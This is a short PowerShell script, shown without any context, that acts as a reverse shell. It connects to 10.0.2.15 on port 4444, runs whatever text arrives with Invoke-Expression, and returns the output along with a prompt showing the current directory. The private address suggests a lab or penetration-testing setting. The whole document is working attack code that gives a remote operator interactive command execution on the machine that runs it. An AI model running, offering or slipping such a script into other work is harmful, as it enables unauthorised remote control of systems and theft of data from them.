$client = New-Object System.Net.Sockets.TCPClient('10.0.2.15', 4444)
$stream = $client.GetStream()
[byte[]]$buffer = 0..65535 | ForEach-Object { 0 }
while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
    $result = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback = ([text.encoding]::ASCII).GetBytes($result + 'PS ' + (pwd).Path + '> ')
    $stream.Write($sendback, 0, $sendback.Length)
}
$client.Close()
